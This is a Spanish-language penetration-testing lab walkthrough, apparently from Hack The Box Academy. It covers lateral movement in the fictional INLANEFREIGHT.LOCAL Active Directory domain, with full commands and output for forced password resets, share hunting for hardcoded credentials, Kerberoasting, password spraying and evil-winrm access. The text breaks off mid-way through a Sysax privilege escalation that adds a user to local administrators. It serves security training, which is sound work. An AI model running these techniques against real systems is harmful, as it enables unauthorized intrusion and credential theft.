Después de saquear el host `DEV01`, encontramos el siguiente conjunto de credenciales al volcar los secretos de LSA:

`hporter:Gr8hambino!`

El módulo `Active Directory Enumeration & Attacks` demuestra varias formas de enumerar AD desde un host de Windows. Ya que hemos comprometido profundamente `DEV01`, podemos usarlo como nuestra área de preparación para lanzar más ataques. Usaremos el reverse shell que capturamos en el host `dmz01` después de explotar `PrintSpoofer` por ahora, ya que es bastante estable. Más adelante, es posible que queramos realizar algunos "port forwarding gymnastics" (acrobacias de reenvío de puertos) adicionales y conectarnos a través de RDP o WinRM, pero este shell debería ser suficiente.

Usaremos el colector [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) para enumerar todos los objetos posibles de AD y luego ingerir los datos en la GUI de BloodHound para su revisión. Podemos descargar el ejecutable (aunque en una evaluación del mundo real, es mejor compilar nuestras propias herramientas) y usar el administrador de archivos DNN para subirlo al objetivo. Queremos recopilar la mayor cantidad de datos posible y no tenemos que preocuparnos por la evasión, así que usaremos el flag `-c All` para usar todos los métodos de recopilación.

```r
c:\DotNetNuke\Portals\0> SharpHound.exe -c All

2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.2519575-07:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
2022-06-22T10:02:32.5800848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.7675820-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-22T10:03:03.3301538-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
2022-06-22T10:03:16.9238698-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-06-22T10:03:18.1426009-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-22T10:03:18.1582366-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-22T10:03:18.6738528-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-22T10:03:18.7050961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Status: 3641 objects finished (+3641 79.15218)/s -- Using 76 MB RAM
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Enumeration finished in 00:00:46.1149865
2022-06-22T10:03:19.1582443-07:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing!
```

Esto generará un archivo Zip ordenado que podemos descargar nuevamente a través de la herramienta de administración de archivos DNN (¡muy conveniente!). Luego, podemos iniciar el servicio `neo4j` (`sudo neo4j start`), escribir `bloodhound` para abrir la herramienta GUI e ingerir los datos.

Buscando a nuestro usuario `hporter` y seleccionando `First Degree Object Control`, podemos ver que el usuario tiene derechos de `ForceChangePassword` sobre el usuario `ssmalls`.

![text](https://academy.hackthebox.com/storage/modules/163/hporter.png)

Como nota al margen, podemos ver que todos los usuarios del dominio tienen acceso RDP sobre el host DEV01. Esto significa que cualquier usuario en el dominio puede acceder mediante RDP y, si pueden escalar privilegios, podrían potencialmente robar datos sensibles como credenciales. Esto vale la pena mencionarlo como un hallazgo; podemos llamarlo `Excessive Active Directory Group Privileges` y etiquetarlo como un riesgo medio. Si todo el grupo tuviera derechos de administrador local sobre un host, definitivamente sería un hallazgo de alto riesgo.

![text](https://academy.hackthebox.com/storage/modules/163/all_rdp.png)

Podemos usar [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) para cambiar la contraseña del usuario `ssmalls`. Vamos a hacer RDP al objetivo después de verificar que el puerto esté abierto. RDP facilitará la interacción con el dominio a través de una consola PowerShell, aunque todavía podríamos hacerlo a través de nuestro acceso reverse shell.

```r
proxychains nmap -sT -p 3389 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
Nmap scan report for 172.16.8.20
Host is up (0.11s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 
```

Para lograr esto, podemos usar otro comando de reenvío de puertos SSH, esta vez `Local Port Forwarding`. El comando nos permite pasar todo el tráfico RDP a `DEV01` a través del host `dmz01` mediante el puerto local 13389.

```r
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

Una vez configurado este reenvío de puerto, podemos usar `xfreerdp` para conectarnos al host utilizando la redirección de unidades para transferir archivos de un lado a otro fácilmente.

```r
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

Notamos que solo obtenemos acceso a la consola ya que este servidor no tiene instalado el rol de Desktop Experience, pero todo lo que necesitamos es una consola. Podemos escribir `net use` para ver la ubicación de nuestra unidad redirigida y luego transferir la herramienta.

```r
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

A continuación, escribe `powershell` para entrar en una consola PowerShell, y podemos usar `PowerView` para cambiar la contraseña del usuario `ssmalls` de la siguiente manera:

```r
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

Podemos volver a nuestro host de ataque y confirmar que la contraseña se cambió exitosamente. Generalmente, querríamos evitar este tipo de actividad durante una prueba de penetración, pero si es nuestro único camino, debemos confirmar con nuestro cliente. La mayoría nos pedirá que procedamos para ver hasta dónde podemos llegar, pero siempre es mejor preguntar. Por supuesto, queremos anotar cualquier cambio como este en nuestro registro de actividades para incluirlos en un anexo de nuestro informe.

```r
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

---

# Share Hunting

Explorando el host y AD un poco más, no vemos nada útil. BloodHound no muestra nada interesante para el usuario `ssmalls`. Volviendo al contenido del `Penetration Tester Path`, recordamos que las secciones [Credentialed Enumeration from Windows](https://academy.hackthebox.com/module/143/section/1421) y [Credentialed Enumeration from Linux](https://academy.hackthebox.com/module/143/section/1269) cubrieron la búsqueda de shares de archivos con Snaffler y CrackMapExec respectivamente. Ha habido muchas veces en pruebas de penetración donde he tenido que recurrir a revisar shares de archivos para encontrar una pieza de información, como una contraseña para una cuenta de servicio o similar. A menudo he podido acceder a shares departamentales (como IT) con credenciales de bajo privilegio debido a permisos NTFS débiles. A veces, incluso puedo acceder a shares para algunos o todos los usuarios en la empresa objetivo debido al mismo problema. Con frecuencia, los usuarios no son conscientes de que su unidad de inicio es un share de red mapeado y no una carpeta local en su computadora, por lo que pueden guardar todo tipo de datos sensibles allí. Los permisos de los shares de archivos son muy difíciles de mantener, especialmente en organizaciones grandes. Me he encontrado revisando shares de archivos a menudo durante pruebas de penetración cuando estoy atascado. Puedo pensar en una prueba específica donde tenía credenciales de usuario pero estaba atascado y me dediqué a revisar shares. Después de un tiempo, encontré un archivo `web.config` que contenía credenciales válidas para una cuenta de servicio MSSQL. Esto me dio derechos de administrador local en un servidor SQL donde un administrador del dominio había iniciado sesión, y fue un éxito total. Otras veces he encontrado archivos con contraseñas en unidades de usuario que me han ayudado a avanzar. Dependiendo de la organización y cómo están configurados sus permisos de archivo, puede haber mucho que revisar y toneladas de "ruido". Una herramienta como Snaffler puede ayudarnos a navegar por eso y centrarnos en los archivos y scripts más importantes. Vamos a intentarlo aquí.

Primero, ejecutemos [Snaffler](https://github.com/SnaffCon/Snaffler) desde nuestra sesión RDP como el usuario `hporter`.

  Share Hunting

```r
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2022-06-22 10:57:33 -07:00 [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$)
Press any key to exit.
```

Esto no muestra nada interesante, así que volvamos a ejecutar nuestra enumeración de shares como el usuario `ssmalls`. Los usuarios pueden tener diferentes permisos, por lo que la enumeración de shares debe considerarse un proceso iterativo. Para evitar tener que hacer RDP nuevamente, podemos usar el módulo [spider_plus](https://mpgn.gitbook.io/crackmapexec/smb-protocol/spidering-shares) de `CrackMapExec` para explorar.

  Share Hunting

```r
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
SPIDER_P... 172.16.8.3      445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.8.3      445    DC01             [*]        DIR: ['print$']
SPIDER_P... 172.16.8.3      445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.8.3      445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

Esto crea un archivo para nosotros en nuestro directorio `/tmp`, así que revisémoslo.

  Share Hunting

```r
cat 172.16.8.3.json 
{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "IPC$": {
        "323a2fd620dcf3e3": {
            "atime_epoch": "1600-12-31 19:03:58",
            "ctime_epoch": "1600-12-31 19:03:58",
            "mtime_epoch": "1600-12-31 19:03:58",
            "size": "3 Bytes"
<SNIP>
```

El archivo `SQL Express Backup.ps1` en el share privado de IT parece muy interesante. Vamos a descargarlo usando `smbclient`. Primero, necesitamos conectarnos.

  Share Hunting

```r
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:34:06 2022
  ..                                  D        0  Wed Jun  1 14:34:06 2022
  Accounting                          D        0  Wed Jun  1 14:34:08 2022
  Executives                          D        0  Wed Jun  1 14:34:04 2022
  Finance                             D        0  Wed Jun  1 14:34:00 2022
  HR                                  D        0  Wed Jun  1 14:33:48 2022
  IT                                  D        0  Wed Jun  1 14:33:42 2022
  Marketing                           D        0  Wed Jun  1 14:33:56 2022
  R&D                                 D        0  Wed Jun  1 14:33:52 2022

		10328063 blocks of size 4096. 8177952 blocks available
```

Luego podemos navegar al share `Development`.

  Share Hunting

```r
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

		10328063 blocks of size 4096. 8177952 blocks available
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Private\Development\SQL
smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
```

Revisando el archivo, vemos que es algún tipo de script de respaldo con credenciales codificadas para `backupadm`, otra contraseña con patrón de teclado. Estoy notando una tendencia en esta organización. Quizás el mismo administrador configuró esto como el que configuró la contraseña que forzamos con `Hydra` anteriormente, ya que esto está relacionado con el desarrollo.

  Share Hunting

```r
cat SQL\ Express\ Backup.ps1 

$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "<REDACTED>"

$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
```

Antes de intentar usar esta cuenta en algún lugar, investiguemos un poco más. Hay un archivo .vbs interesante en el share SYSVOL, que es accesible para todos los usuarios del dominio.

  Share Hunting

```r
     },
       "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
           "atime_epoch": "2022-06-01 14:34:41",
           "ctime_epoch": "2022-06-01 14:34:41",
           "mtime_epoch": "2022-06-01 14:34:39",
           "size": "32.15 KB"
```

Podemos descargarlo nuevamente con `smbclient`.

  Share Hunting

```r
proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:10:57 2022
  ..                                  D        0  Wed Jun  1 14:10:57 2022
  INLANEFREIGHT.LOCAL                Dr        0  Wed Jun  1 14:10:57 2022
smb: \INLANEFREIGHT.LOCAL\> cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Wed Jun  1 14:34:41 2022
  ..                                  D        0  Wed Jun  1 14:34:41 2022
  adum.vbs                            A    32921  Wed Jun  1 14:34:39 2022

		10328063 blocks of size 4096. 8177920 blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs 
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
```

Revisando el script, encontramos otro conjunto de credenciales: `helpdesk:L337^p@$$w0rD`

  Share Hunting

```r
cat adum.vbs 

Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21

<SNIP>

Const cSubject = "Active Directory User Management report"	'EMAIL - SUBJECT LINE

''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"	
```

Al buscar en BloodHound, no encontramos un usuario `helpdesk`, por lo que esta puede ser solo una contraseña antigua. Según el año en los comentarios del script, probablemente lo sea. Aun así, podemos agregar esto a nuestros hallazgos sobre datos sensibles en shares de archivos y anotarlo en la sección de credenciales de nuestras notas del proyecto. A veces encontramos contraseñas antiguas que todavía se usan para cuentas de servicio antiguas que podemos usar para un ataque de password spraying.

---

## Kerberoasting

Para cubrir todas nuestras bases, revisemos si hay algún usuario Kerberoastable. Podemos hacer esto a través de Proxychains usando `

GetUserSPNs.py` o `PowerView`. En nuestra sesión RDP, cargaremos PowerView y enumeraremos las cuentas de Service Principal Name (SPN).

  Share Hunting

```r
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Hay bastantes. Exportemos estos a un archivo CSV para procesarlo sin conexión.

  Share Hunting

```r
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

Podemos descargar este archivo a través de la redirección de unidades RDP que configuramos anteriormente: `copy .\ilfreight_spns.csv \\Tsclient\Home`. Abrimos el archivo .csv usando LibreOffice Calc o Excel, sacamos los hashes y los agregamos a un archivo. Ahora podemos ejecutarlos a través de Hashcat para ver si podemos descifrar alguno y, de ser así, si son para cuentas privilegiadas.

  Share Hunting

```r
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$31b8f218c848bd851df59641a45<SNIP>:<redacted>
```

Un hash se descifra, pero al revisar en BloodHound, la cuenta no parece ser útil para nosotros. Aun así, podemos anotar otro hallazgo para `Weak Kerberos Authentication Configuration (Kerberoasting)` y seguir adelante.

---

## Password Spraying

Otra técnica de movimiento lateral que vale la pena explorar es Password Spraying. Podemos usar [DomainPasswordSpray.ps1](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1) o la versión de Windows de Kerbrute desde el host DEV01 o usar Kerbrute desde nuestro host de ataque a través de Proxychains (vale la pena probar todos).

  Share Hunting

```r
PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2913 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2913 users. Current time is 11:47 AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying is complete
```

Encontramos una contraseña válida para dos usuarios más, pero ninguno tiene acceso interesante. Aun así, vale la pena anotar un hallazgo para `Weak Active Directory Passwords` permitidas y seguir adelante.

---

## Misc Techniques

Probemos algunas cosas más para cubrir todas nuestras bases. Podemos buscar en el share SYSVOL archivos `Registry.xml` que puedan contener contraseñas para usuarios configurados con autologon a través de Group Policy.

  Share Hunting

```r
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
GPP_AUTO... 172.16.8.3      445    DC01             [+] Found SYSVOL share
GPP_AUTO... 172.16.8.3      445    DC01             [*] Searching for Registry.xml
```

Esto no muestra nada útil. Sigamos adelante, podemos buscar contraseñas en los campos `Description` de los usuarios en AD, lo cual no es muy común, pero aun así lo vemos de vez en cuando (¡Incluso he visto contraseñas de cuentas Domain y Enterprise Admin aquí!).

  Share Hunting

```r
PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-in account for guest access to the computer/d...
krbtgt         Key Distribution Center Service Account
```

Encontramos una para la cuenta `frontdesk`, pero esta tampoco es útil. Vale la pena notar que hay muchas maneras de obtener una contraseña de cuenta de usuario en este dominio, y hay un host con privilegios RDP otorgados a todos los usuarios del dominio. Aunque estas cuentas no tienen ningún derecho especial, sería una prioridad que el cliente solucione estos problemas porque un atacante a menudo solo necesita una contraseña para tener éxito en AD. Aquí podemos anotar un hallazgo para `Passwords in AD User Description Field` y continuar.

---

## Next Steps

En este punto, hemos investigado el dominio bastante a fondo y hemos encontrado varios conjuntos de credenciales, pero hemos llegado a un punto muerto. Volviendo a lo básico, podemos ejecutar un escaneo para ver si algún host tiene WinRM habilitado e intentar conectarnos con cada conjunto de credenciales.

  Share Hunting

```r
proxychains nmap -sT -p 5985 172.16.8.50

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
Nmap scan report for 172.16.8.50
Host is up (0.12s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

El host `172.16.8.50`, o `MS01` es el único que nos queda aparte del Domain Controller, así que intentemos con las credenciales del usuario `backupadm`.

¡Funciona, y estamos dentro!

  Share Hunting

```r
proxychains evil-winrm -i 172.16.8.50 -u backupadm 

ProxyChains-3.1 (http://proxychains.sf.net)
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> hostname
ACADEMY-AEN-MS01
```

En este punto, podríamos usar este shell evil-winrm para enumerar aún más el dominio con una herramienta como PowerView. Ten en cuenta que necesitaremos usar un objeto PSCredential para realizar la enumeración desde este shell debido al [Kerberos "Double Hop" problem](https://academy.hackthebox.com/module/143/section/1573). Practica esta técnica y ve qué otras herramientas de enumeración de AD puedes usar de esta manera.

Volviendo a la tarea en cuestión. Nuestro usuario no es un administrador local, y `whoami /priv` no muestra ningún privilegio útil. Al revisar el módulo `Windows Privilege Escalation`, no encontramos nada interesante, así que busquemos credenciales. Después de investigar un poco, encontramos un archivo `unattend.xml` sobrante de una instalación anterior.

  Share Hunting

```r
*Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\panther> dir


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM           6995 unattend.xml
```

Verifiquemos si contiene contraseñas, ya que a veces lo hacen.

  Share Hunting

```r

*Evil-WinRM* PS C:\panther> type unattend.xml

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <InputLocale>de-de</InputLocale>
            <SystemLocale>de-de</SystemLocale>
            <UILanguage>de-de</UILanguage>
            <UILanguageFallback>de-de</UILanguageFallback>
            <UserLocale>de-de</UserLocale>
        </component>
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
            </AutoLogon>
        
        <SNIP>

        </component>
    </settings>
</unattend>
```

Encontramos credenciales para el usuario local `ilfserveradm`, con la contraseña `Sys26Admin`.

  Share Hunting

```r
*Evil-WinRM* PS C:\panther> net user ilfserveradm

User name                    ilfserveradm
Full Name                    ilfserveradm
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 2:17:17 PM
Password expires             Never
Password changeable          6/1/2022 2:17:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/1/2022 2:17:17 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

Este no es un usuario del dominio, pero es interesante que este usuario tenga acceso a Remote Desktop pero no sea miembro del grupo de administradores locales. Hagamos RDP y veamos qué podemos hacer. Después de hacer RDP y realizar más enumeraciones, encontramos algún software no estándar instalado en el directorio `C:\Program Files (x86)\SysaxAutomation`. Una búsqueda rápida produce [este](https://www.exploit-db.com/exploits/50834) exploit de escalación de privilegios local. Según el escrito, este servicio de Sysax Scheduled Service se ejecuta como la cuenta local SYSTEM y permite a los usuarios crear y ejecutar trabajos de respaldo. Si se elimina la opción de ejecutar como usuario, predeterminará ejecutar la tarea como la cuenta SYSTEM. ¡Vamos a probarlo!

Primero, crea un archivo llamado `pwn.bat` en `C:\Users\ilfserveradm\Documents` que contenga la línea `net localgroup administrators ilfserveradm /add` para agregar nuestro usuario al grupo de administradores locales (algo que necesitaríamos limpiar y anotar en nuestros apéndices del informe). Luego, podemos realizar los siguientes pasos:

- Abre `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
- Selecciona `Setup Scheduled/Triggered Tasks`
- Agrega una tarea (Triggered)
- Actualiza la carpeta a monitorear a `C:\Users\ilfserveradm\Documents`
